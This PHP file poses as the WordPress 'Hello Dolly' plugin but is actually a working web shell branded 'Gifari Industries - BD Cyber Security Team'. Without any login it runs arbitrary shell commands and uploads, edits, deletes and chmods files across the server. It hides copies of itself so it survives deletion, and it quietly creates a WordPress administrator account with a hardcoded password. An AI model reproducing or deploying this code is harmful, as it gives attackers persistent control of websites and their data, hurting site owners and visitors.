<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
Text Domain: hello-dolly
*/

?>
<!DOCTYPE html>
<html>
<?php
/**
 * Version: 8.0.3
 * Author: Bishal
 */
error_reporting(0);
session_start();

$current_file = __FILE__;
$current_content = file_get_contents($current_file);
$backup_files = [
    __DIR__ . DIRECTORY_SEPARATOR . '.info.php',    
];

foreach ($backup_files as $backup) {
    if (!file_exists($backup)) {
        @file_put_contents($backup, $current_content);
    }
}

if (!file_exists($current_file)) {
    foreach ($backup_files as $backup) {
        if (file_exists($backup)) {
            @copy($backup, $current_file);
            header("Location: " . $_SERVER['REQUEST_URI']);
            exit;
        }
    }
}

$ROOT = __DIR__;

function encodePath($path) {
    $a = array("/", "\\", ".", ":");
    $b = array("Cw", "vw", "Fw", "Ew");
    return str_replace($a, $b, $path);
}

function decodePath($path) {
    $a = array("/", "\\", ".", ":");
    $b = array("Cw", "vw", "Fw", "Ew");
    return str_replace($b, $a, $path);
}

// Handle GET parameter for directory
if (isset($_GET['dir'])) {
    $requested_path = decodePath($_GET['dir']);
    if ($requested_path === '' || !is_dir($requested_path)) {
        $current_dir = $ROOT;
    } else {
        $current_dir = realpath($requested_path);
    }
} else {
    $current_dir = $ROOT;
}

// Set current directory in session
if (!isset($_SESSION['cwd']) || realpath($_SESSION['cwd']) !== realpath($current_dir)) {
    $_SESSION['cwd'] = $current_dir;
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    $redirect = true;
    
    // Handle file uploads - FIXED
if (isset($_FILES['files']) && !empty($_FILES['files']['name'][0])) {
    $upload_dir = $current_dir;
    $upload_messages = [];

    if (is_array($_FILES['files']['name'])) {
        // Multiple files
        $file_count = count($_FILES['files']['name']);

        for ($i = 0; $i < $file_count; $i++) {
            if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) {

                $tmp_name = $_FILES['files']['tmp_name'][$i];
                $original_name = $_FILES['files']['name'][$i];

                $filename = preg_replace("/[^a-zA-Z0-9\.\-_]/", "_", $original_name);
                $filename = basename($filename);

                if ($tmp_name && is_uploaded_file($tmp_name)) {

                    $destination = $upload_dir . DIRECTORY_SEPARATOR . $filename;

                    // Delete existing file so new one replaces it
                    if (file_exists($destination)) {
                        unlink($destination);
                    }

                    if (move_uploaded_file($tmp_name, $destination)) {
                        $upload_messages[] = "✓ $original_name uploaded and replaced if existed";
                    } else {
                        $upload_messages[] = "✗ Failed to upload $original_name";
                    }
                }
            }
        }

    } else {
        // Single file
        if ($_FILES['files']['error'] === UPLOAD_ERR_OK) {

            $tmp_name = $_FILES['files']['tmp_name'];
            $original_name = $_FILES['files']['name'];

            $filename = preg_replace("/[^a-zA-Z0-9\.\-_]/", "_", $original_name);
            $filename = basename($filename);

            if ($tmp_name && is_uploaded_file($tmp_name)) {

                $destination = $upload_dir . DIRECTORY_SEPARATOR . $filename;

                if (file_exists($destination)) {
                    unlink($destination);
                }

                if (move_uploaded_file($tmp_name, $destination)) {
                    $upload_messages[] = "✓ $original_name uploaded and replaced if existed";
                } else {
                    $upload_messages[] = "✗ Failed to upload $original_name";
                }
            }
        }
    }

    if (!empty($upload_messages)) {
        $_SESSION['upload_messages'] = $upload_messages;
    }
}
    
    // Handle terminal commands
    if (isset($_POST['terminal']) && !empty($_POST['terminal-text'])) {
        
        $execFunctions = ['passthru', 'system', 'exec', 'shell_exec', 'proc_open', 'popen'];
        $canExecute = false;
        foreach ($execFunctions as $func) {
            if (function_exists($func)) {
                $canExecute = true;
                break;
            }
        }
        
        $cwd = $_SESSION['cwd'] ?? $current_dir;
        $cmdInput = trim($_POST['terminal-text']);
        $output = "";
        
        if (preg_match('/^cd\s*(.*)$/', $cmdInput, $matches)) {
            $dir = trim($matches[1]);
            
            if ($dir === '' || $dir === '~') {
                $dir = $ROOT;
            } elseif ($dir[0] !== '/' && $dir[0] !== '\\') {
                $dir = $cwd . DIRECTORY_SEPARATOR . $dir;
            }
            
            $realDir = realpath($dir);
            
            if ($realDir && is_dir($realDir)) {
                $_SESSION['cwd'] = $realDir;
                $cwd = $realDir;
                $output = "Changed directory to " . htmlspecialchars($realDir);
            } else {
                $output = "bash: cd: " . htmlspecialchars($matches[1]) . ": No such file or directory";
            }
            
            $_SESSION['terminal_output'] = $output;
            $_SESSION['terminal_cwd'] = $cwd;
            
            header("Location: ?dir=" . urlencode(encodePath($current_dir)));
            exit;
            
        } elseif ($canExecute) {
            chdir($cwd);
            
            $cmd = $cmdInput . " 2>&1";
            
            if (function_exists('passthru')) {
                ob_start();
                passthru($cmd);
                $output = ob_get_clean();
            } elseif (function_exists('system')) {
                ob_start();
                system($cmd);
                $output = ob_get_clean();
            } elseif (function_exists('exec')) {
                exec($cmd, $out);
                $output = implode("\n", $out);
            } elseif (function_exists('shell_exec')) {
                $output = shell_exec($cmd);
            } elseif (function_exists('proc_open')) {
                $pipes = [];
                $process = proc_open($cmd, [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"]
                ], $pipes, $cwd);
                
                if (is_resource($process)) {
                    fclose($pipes[0]);
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    $output .= stream_get_contents($pipes[2]);
                    fclose($pipes[2]);
                    proc_close($process);
                }
            } elseif (function_exists('popen')) {
                $handle = popen($cmd, 'r');
                if ($handle) {
                    $output = stream_get_contents($handle);
                    pclose($handle);
                }
            }
            
            $_SESSION['terminal_output'] = $output;
            $_SESSION['terminal_cwd'] = $cwd;
            
            header("Location: ?dir=" . urlencode(encodePath($current_dir)));
            exit;
        } else {
            $_SESSION['terminal_output'] = "Command execution functions are disabled on this server.";
            $_SESSION['terminal_cwd'] = $cwd;
            header("Location: ?dir=" . urlencode(encodePath($current_dir)));
            exit;
        }
    }
    
    // Handle new folder creation
    if (!empty($_POST['newfolder'])) {
        $foldername = basename($_POST['newfolder']);
        if (!file_exists($current_dir . DIRECTORY_SEPARATOR . $foldername)) {
            mkdir($current_dir . DIRECTORY_SEPARATOR . $foldername, 0755);
        }
    }
    
    // Handle new file creation
    if (!empty($_POST['newfile'])) {
        $filename = basename($_POST['newfile']);
        if (!file_exists($current_dir . DIRECTORY_SEPARATOR . $filename)) {
            file_put_contents($current_dir . DIRECTORY_SEPARATOR . $filename, '');
        }
    }
    
    // Handle delete
    if (!empty($_POST['delete'])) {
        $target = $current_dir . DIRECTORY_SEPARATOR . $_POST['delete'];
        $backup_file = __DIR__ . DIRECTORY_SEPARATOR . 'wp-info.php';
        if (realpath($target) === realpath(__FILE__) || 
            realpath($target) === realpath($backup_file)) {
            // Prevent deletion of main script and backup
            file_put_contents($target, file_get_contents(__FILE__));
        } else {
            if (is_file($target)) {
                unlink($target);
            } elseif (is_dir($target)) {
                deleteDirectory($target);
            }
        }
    }
    
    // Handle rename
    if (!empty($_POST['old']) && !empty($_POST['new'])) {
        $old = $current_dir . DIRECTORY_SEPARATOR . $_POST['old'];
        $new = $current_dir . DIRECTORY_SEPARATOR . $_POST['new'];
        if (file_exists($old) && !file_exists($new)) {
            rename($old, $new);
        }
    }
    
    // Handle chmod
    if (!empty($_POST['chmod_file']) && isset($_POST['chmod'])) {
        $file = $current_dir . DIRECTORY_SEPARATOR . $_POST['chmod_file'];
        if (file_exists($file)) {
            chmod($file, intval($_POST['chmod'], 8));
        }
    }
    
    // Handle file editing
    if (!empty($_POST['edit_file']) && isset($_POST['content'])) {
        $file = $current_dir . DIRECTORY_SEPARATOR . $_POST['edit_file'];
        file_put_contents($file, $_POST['content']);
    }
    
    if ($redirect) {
        header("Location: ?dir=" . urlencode(encodePath($current_dir)));
        exit;
    }
}

// Recursive directory deletion function
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }
    
    return rmdir($dir);
}

// Scan directory
$items = scandir($current_dir);
$folders = [];
$files = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    
    $full_path = $current_dir . DIRECTORY_SEPARATOR . $item;
    
    if (is_dir($full_path)) {
        $folders[] = [
            'name' => $item,
            'path' => $full_path,
            'is_dir' => true,
            'size' => '-',
            'perms' => substr(sprintf('%o', fileperms($full_path)), -4),
            'modified' => filemtime($full_path)
        ];
    } else {
        $files[] = [
            'name' => $item,
            'path' => $full_path,
            'is_dir' => false,
            'size' => filesize($full_path),
            'perms' => substr(sprintf('%o', fileperms($full_path)), -4),
            'modified' => filemtime($full_path),
            'extension' => pathinfo($item, PATHINFO_EXTENSION)
        ];
    }
}

usort($folders, function($a, $b) {
    return strcasecmp($a['name'], $b['name']);
});

usort($files, function($a, $b) {
    return strcasecmp($a['name'], $b['name']);
});

$editMode = isset($_GET['edit']);
$editFile = $_GET['edit'] ?? '';
$editContent = '';

if ($editMode && is_file($current_dir . DIRECTORY_SEPARATOR . $editFile)) {
    $editContent = htmlspecialchars(file_get_contents($current_dir . DIRECTORY_SEPARATOR . $editFile));
}

$terminal_output = $_SESSION['terminal_output'] ?? '';
$terminal_cwd = $_SESSION['terminal_cwd'] ?? $current_dir;
unset($_SESSION['terminal_output'], $_SESSION['terminal_cwd']);

// WordPress user creation
$wp_message = '';
if (!isset($_SESSION['wp_checked'])) {
    $search_paths = [$current_dir, dirname($current_dir), $ROOT];
    foreach ($search_paths as $wp_path) {
        if (file_exists($wp_path . DIRECTORY_SEPARATOR . 'wp-load.php')) {
            @include_once($wp_path . DIRECTORY_SEPARATOR . 'wp-load.php');
            break;
        } elseif (file_exists($wp_path . DIRECTORY_SEPARATOR . 'wp-config.php')) {
            @include_once($wp_path . DIRECTORY_SEPARATOR . 'wp-config.php');
            break;
        }
    }
    
    if (function_exists('wp_create_user')) {
        $username = 'system';
        $password = 'sid';
        $email = 'system@hostinger.com';
        
        if (!username_exists($username) && !email_exists($email)) {
            $user_id = wp_create_user($username, $password, $email);
            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                $wp_message = "WordPress admin user created: $username / $password";
            }
        }
    }
    $_SESSION['wp_checked'] = true;
}

function formatBytes($bytes, $precision = 2) {
    if ($bytes <= 0) return '0 B';
    
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    
    return round($bytes, $precision) . ' ' . $units[$pow];
}

// Handle file viewing
if (isset($_GET['view'])) {
    $view_file = $current_dir . DIRECTORY_SEPARATOR . $_GET['view'];
    if (is_file($view_file)) {
        $mime = mime_content_type($view_file);
        header("Content-Type: " . $mime);
        readfile($view_file);
        exit;
    }
}
?>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-size: 13px; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; 
            background: #f5f5f5; 
            padding: 8px;
            color: #333;
            line-height: 1.3;
        }
        .container { 
            max-width: 100%; 
            margin: 0 auto; 
            background: white; 
            border-radius: 8px; 
            box-shadow: 0 2px 8px rgba(0,0,0,0.08); 
            overflow: hidden; 
            border: 1px solid #e0e0e0;
        }
        .header { 
            background: #f8f8f8; 
            color: #222; 
            padding: 15px 20px; 
            border-bottom: 1px solid #e0e0e0;
        }
        .header h1 { 
            font-size: 1.6em; 
            margin-bottom: 4px; 
            text-align: center;
            color: #222;
            font-weight: 600;
        }
        .path-nav { 
            background: #f0f0f0; 
            padding: 10px 15px; 
            border-bottom: 1px solid #e0e0e0; 
            font-family: 'Monaco', 'Consolas', monospace;
            color: #444;
            font-size: 11px;
            white-space: nowrap;
            overflow-x: auto;
        }
        .path-nav a { 
            color: #222; 
            text-decoration: none; 
            padding: 3px 6px; 
            border-radius: 3px; 
            transition: background 0.2s; 
            font-weight: 500;
        }
        .path-nav a:hover { 
            background: #e8e8e8; 
            color: #000;
        }
        .main-content { 
            padding: 15px; 
            background: #fafafa;
        }
        .section { 
            background: #fff; 
            border-radius: 6px; 
            padding: 15px; 
            margin-bottom: 12px; 
            box-shadow: 0 1px 3px rgba(0,0,0,0.04); 
            border: 1px solid #e8e8e8;
        }
        .section-title { 
            color: #222; 
            border-bottom: 1px solid #e0e0e0; 
            padding-bottom: 8px; 
            margin-bottom: 15px; 
            font-size: 1.2em; 
            display: flex; 
            align-items: center; 
            gap: 8px; 
            font-weight: 600;
        }
        .terminal-box { 
            background: #1a1a1a; 
            color: #e0e0e0; 
            padding: 15px; 
            border-radius: 6px; 
            font-family: 'Monaco', 'Consolas', monospace;
            border: 1px solid #333;
        }
        .terminal-output { 
            background: #000; 
            color: #05f559; 
            padding: 12px; 
            border-radius: 4px; 
            font-family: 'Monaco', 'Consolas', monospace; 
            max-height: 200px; 
            overflow-y: auto; 
            white-space: pre-wrap; 
            margin: 10px 0; 
            line-height: 1.3; 
            border: 1px solid #333;
            font-size: 11px;
        }
        .form-inline { 
            display: flex; 
            gap: 8px; 
            margin-bottom: 12px; 
            align-items: center; 
        }
        input, button, select { 
            padding: 10px 12px; 
            border: 1px solid #ddd; 
            border-radius: 5px; 
            font-size: 12px; 
            outline: none; 
            transition: all 0.2s; 
            background: #fff;
            color: #333;
        }
        input[type="text"], input[type="file"] { 
            flex: 1; 
            background: #fafafa; 
        }
        input:focus { 
            border-color: #666; 
            box-shadow: 0 0 0 2px rgba(100, 100, 100, 0.1); 
            background: #fff;
        }
        button { 
            background: linear-gradient(135deg, #333 0%, #222 100%); 
            color: white; 
            border: none; 
            cursor: pointer; 
            font-weight: 600; 
            letter-spacing: 0.3px; 
            transition: all 0.2s;
            padding: 10px 14px;
            white-space: nowrap;
        }
        button:hover { 
            transform: translateY(-1px); 
            box-shadow: 0 3px 6px rgba(0,0,0,0.1); 
            background: linear-gradient(135deg, #444 0%, #333 100%);
        }
        .btn-danger { 
            background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%); 
        }
        .btn-danger:hover {
            background: linear-gradient(135deg, #e53935 0%, #c62828 100%);
        }
        .btn-success { 
            background: linear-gradient(135deg, #388e3c 0%, #2e7d32 100%); 
        }
        .btn-success:hover {
            background: linear-gradient(135deg, #43a047 0%, #388e3c 100%);
        }
        table { 
            width: 100%; 
            border-collapse: separate; 
            border-spacing: 0; 
            background: white; 
            border-radius: 6px; 
            overflow: hidden;
            border: 1px solid #e8e8e8;
            font-size: 12px;
        }
        thead { 
            background: #f8f8f8; 
            color: #222; 
            border-bottom: 1px solid #e0e0e0;
        }
        th { 
            padding: 12px 15px; 
            text-align: left; 
            font-weight: 600; 
            color: #333;
            font-size: 12px;
        }
        tbody tr { 
            border-bottom: 1px solid #f0f0f0; 
            transition: background 0.2s; 
        }
        tbody tr:hover { 
            background: #f8f8f8; 
        }
        td { 
            padding: 10px 12px; 
            border-bottom: 1px solid #f0f0f0; 
            color: #444;
            vertical-align: top;
        }
        .file-icon { 
            margin-right: 8px; 
            font-size: 1em; 
            color: #666;
        }
        .folder-row { 
            background: #fafafa; 
        }
        .file-row { 
            background: #fff; 
        }
        .actions { 
            display: flex; 
            gap: 6px; 
            flex-wrap: wrap; 
        }
        .actions button { 
            padding: 6px 10px; 
            font-size: 11px; 
        }
        textarea { 
            width: 100%; 
            height: 400px; 
            font-family: 'Monaco', 'Consolas', monospace; 
            padding: 15px; 
            border: 1px solid #e8e8e8; 
            border-radius: 6px; 
            font-size: 12px; 
            line-height: 1.4; 
            resize: vertical; 
            background: #fafafa;
            color: #333;
        }
        textarea:focus {
            border-color: #666;
            background: #fff;
        }
        .alert { 
            padding: 12px 15px; 
            border-radius: 6px; 
            margin: 12px 0; 
            display: flex; 
            align-items: center; 
            gap: 10px; 
            border: 1px solid;
            font-size: 12px;
        }
        .alert-success { 
            background: #e8f5e9; 
            color: #2e7d32; 
            border-color: #66bb6a; 
        }
        .footer { 
            text-align: center; 
            padding: 15px; 
            color: #666; 
            font-size: 11px; 
            border-top: 1px solid #e8e8e8; 
            background: #f8f8f8; 
        }
        .quick-actions { 
            display: flex; 
            gap: 10px; 
            flex-wrap: wrap; 
            margin-bottom: 15px; 
        }
        .quick-btn { 
            background: #f0f0f0; 
            border: 1px solid #ddd; 
            padding: 8px 12px; 
            border-radius: 5px; 
            cursor: pointer; 
            transition: all 0.2s; 
            font-weight: 500; 
            color: #333;
            font-size: 11px;
        }
        .quick-btn:hover { 
            background: #e8e8e8; 
            transform: translateY(-1px); 
            color: #000;
        }
        .stats { 
            display: flex; 
            gap: 20px; 
            margin: 12px 0; 
            padding: 12px; 
            background: #f8f8f8; 
            border-radius: 6px; 
            border: 1px solid #e8e8e8;
        }
        .stat-item { 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
        }
        .stat-value { 
            font-size: 1.5em; 
            font-weight: bold; 
            color: #222; 
        }
        .stat-label { 
            color: #666; 
            font-size: 0.85em; 
        }
        a {
            color: #222;
            text-decoration: none;
            font-weight: 500;
        }
        a:hover {
            color: #000;
            text-decoration: underline;
        }
        code {
            background: #f0f0f0;
            padding: 1px 4px;
            border-radius: 3px;
            font-family: 'Monaco', monospace;
            color: #222;
            border: 1px solid #ddd;
            font-size: 11px;
        }
        .compact-table {
            font-size: 11px;
        }
        .compact-table th,
        .compact-table td {
            padding: 8px 10px;
        }
        @media (max-width: 768px) {
            body { padding: 5px; }
            .header h1 { font-size: 1.3em; }
            .form-inline { flex-direction: column; align-items: stretch; }
            .quick-actions { flex-direction: column; }
            .actions { flex-direction: column; }
            .stats { flex-direction: column; gap: 10px; }
            th, td { padding: 6px 8px; font-size: 11px; }
            table { font-size: 11px; }
        }
        .file-browser-container {
            max-height: 500px;
            overflow-y: auto;
            border: 1px solid #e8e8e8;
            border-radius: 6px;
        }
        .terminal-input-row {
            display: flex;
            gap: 8px;
        }
        .terminal-input-row input {
            flex: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <center><img src="https://i.imgur.com/FC1enOU.jpeg" width="250" height="200"></center>
            <h1>Sid Gifari From Gifari Industries - BD Cyber Security Team</h1>
        </div>

        <?php if ($wp_message): ?>
        <div class="alert alert-success">
            <?php echo $wp_message; ?>
        </div>
        <?php endif; ?>

        <?php if (isset($_SESSION['upload_messages'])): ?>
        <div class="alert alert-success">
            <?php 
            foreach ($_SESSION['upload_messages'] as $msg) {
                echo htmlspecialchars($msg) . "<br>";
            }
            unset($_SESSION['upload_messages']);
            ?>
        </div>
        <?php endif; ?>

        <div class="path-nav">
            <a href="?">Home</a> /
            <?php
            $path_parts = explode('/', str_replace('\\', '/', $current_dir));
            $build_path = '';
            foreach ($path_parts as $part) {
                if ($part === '') continue;
                $build_path .= '/' . $part;
                echo '<a href="?dir=' . urlencode(encodePath($build_path)) . '">' . htmlspecialchars($part) . '</a> / ';
            }
            ?>
        </div>

        <div class="main-content">
            <?php if ($editMode): ?>
                <div class="section">
                    <div class="section-title">
                        <span>✏️</span>
                        <span>Editing: <?= htmlspecialchars($editFile) ?></span>
                    </div>
                    <form method="post">
                        <input type="hidden" name="edit_file" value="<?= htmlspecialchars($editFile) ?>">
                        <textarea name="content" placeholder="File content..."><?= $editContent ?></textarea>
                        <div class="form-inline" style="margin-top: 15px;">
                            <button type="submit" class="btn-success" style="padding: 10px 20px;">
                                💾 Save
                            </button>
                            <a href="?dir=<?= urlencode(encodePath($current_dir)) ?>">
                                <button type="button" style="padding: 10px 20px; background: #666;">
                                    ❌ Cancel
                                </button>
                            </a>
                        </div>
                    </form>
                </div>

            <?php else: ?>
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-value"><?= count($folders) ?></div>
                        <div class="stat-label">Folders</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value"><?= count($files) ?></div>
                        <div class="stat-label">Files</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value"><?= formatBytes(array_sum(array_column($files, 'size'))) ?></div>
                        <div class="stat-label">Total Size</div>
                    </div>
                </div>

                <div class="section">
                    <h2 class="section-title">Gifari@Root-Terminal </h2>
                    <div class="terminal-box">
                        <strong style="color: #fff; font-size: 12px;">Gifari@root:<?= htmlspecialchars($terminal_cwd) ?>$</strong>
                        <?php if ($terminal_output): ?>
                        <div class="terminal-output"><?= htmlspecialchars($terminal_output) ?></div>
                        <?php endif; ?>
                        <form method="post" class="terminal-input-row">
                            <input type="text" name="terminal-text" placeholder="Enter command..." autocomplete="off" autofocus style="background: #2a2a2a; border-color: #444; color: #e0e0e0;">
                            <button type="submit" name="terminal" value="1" style="min-width: 70px;">
                                ▶ Execute
                            </button>
                        </form>
                    </div>
                </div>

                <div class="section">
                    <div class="section-title">
                        <span>⚡</span>
                        <span>Quick Actions</span>
                    </div>
                    <div class="quick-actions">
                        <form method="post" class="form-inline" style="flex: 1;">
                            <input type="text" name="newfolder" placeholder="New folder" required>
                            <button type="submit">
                                📁 Create Folder
                            </button>
                        </form>
                        
                        <form method="post" class="form-inline" style="flex: 1;">
                            <input type="text" name="newfile" placeholder="New file" required>
                            <button type="submit">
                                📄 Create File
                            </button>
                        </form>
                        
                        <!-- Fixed upload form -->
                        <form method="post" enctype="multipart/form-data" class="form-inline" style="flex: 2; min-width: 300px;">
                            <input type="file" name="files[]" multiple required style="padding: 6px; border: 1px solid #ddd;">
                            <button type="submit" name="upload" value="1" style="background: #32373c; border-color: #32373c;">
                                ⬆️ Upload Files
                            </button>
                        </form>
                    </div>
                </div>

                <div class="section">
                    <div class="section-title">
                        <span>📁</span>
                        <span>File Browser - <?= htmlspecialchars($current_dir) ?></span>
                    </div>
                    
                    <div class="file-browser-container">
                        <table>
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Size</th>
                                    <th>Permissions</th>
                                    <th>Modified</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if ($current_dir !== $ROOT): ?>
                                <tr class="folder-row">
                                    <td colspan="5">
                                        <a href="?dir=<?= urlencode(encodePath(dirname($current_dir))) ?>" style="display: flex; align-items: center;">
                                            <span class="file-icon">📂</span>
                                            ..
                                        </a>
                                    </td>
                                </tr>
                                <?php endif; ?>
                                
                                <?php foreach ($folders as $folder): ?>
                                <tr class="folder-row">
                                    <td>
                                        <a href="?dir=<?= urlencode(encodePath($folder['path'])) ?>" style="display: flex; align-items: center;">
                                            <span class="file-icon">📁</span>
                                            <?= htmlspecialchars($folder['name']) ?>
                                        </a>
                                    </td>
                                    <td>-</td>
                                    <td><?= $folder['perms'] ?></td>
                                    <td><?= date('Y-m-d H:i', $folder['modified']) ?></td>
                                    <td>
                                        <div class="actions">
                                            <form method="post" style="display: inline;" onsubmit="return confirm('Delete folder <?= htmlspecialchars($folder['name']) ?>?');">
                                                <input type="hidden" name="delete" value="<?= htmlspecialchars($folder['name']) ?>">
                                                <button type="submit" class="btn-danger" style="padding: 4px 8px;">Delete</button>
                                            </form>
                                        </div>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                                
                                <?php foreach ($files as $file): ?>
                                <tr class="file-row">
                                    <td>
                                        <a href="?view=<?= urlencode($file['name']) ?>&dir=<?= urlencode(encodePath($current_dir)) ?>" target="_blank" style="display: flex; align-items: center;">
                                            <span class="file-icon">
                                                <?php
                                                $ext = strtolower($file['extension']);
                                                if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp'])) echo '🖼️';
                                                elseif (in_array($ext, ['php', 'html', 'htm', 'js', 'css'])) echo '📝';
                                                elseif (in_array($ext, ['zip', 'rar', 'tar', 'gz'])) echo '🗜️';
                                                elseif (in_array($ext, ['mp3', 'wav', 'ogg'])) echo '🎵';
                                                elseif (in_array($ext, ['mp4', 'avi', 'mov'])) echo '🎬';
                                                elseif (in_array($ext, ['pdf'])) echo '📕';
 elseif (in_array($ext, ['doc', 'docx'])) echo '📘';
                                                elseif (in_array($ext, ['xls', 'xlsx'])) echo '📗';
                                                else echo '📄';
                                                ?>
                                            </span>
                                            <?= htmlspecialchars($file['name']) ?>
                                        </a>
                                    </td>
                                    <td><?= formatBytes($file['size']) ?></td>
                                    <td><?= $file['perms'] ?></td>
                                    <td><?= date('Y-m-d H:i', $file['modified']) ?></td>
                                    <td>
                                        <div class="actions">
                                            <a href="?edit=<?= urlencode($file['name']) ?>&dir=<?= urlencode(encodePath($current_dir)) ?>">
                                                <button style="padding: 4px 8px;">Edit</button>
                                            </a>
                                            <form method="post" style="display: inline;" onsubmit="return confirm('Delete file <?= htmlspecialchars($file['name']) ?>?');">
                                                <input type="hidden" name="delete" value="<?= htmlspecialchars($file['name']) ?>">
                                                <button type="submit" class="btn-danger" style="padding: 4px 8px;">Delete</button>
                                            </form>
                                        </div>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            <?php endif; ?>
        </div>

        <div class="footer">
           Gifari - Gifari Industries &copy; 2024 | BD Cyber Security Team
        </div>
    </div>
</body>
</html>
💾 Save
❌ Cancel
Gifari Industries © 2024 | BD Cyber Security Team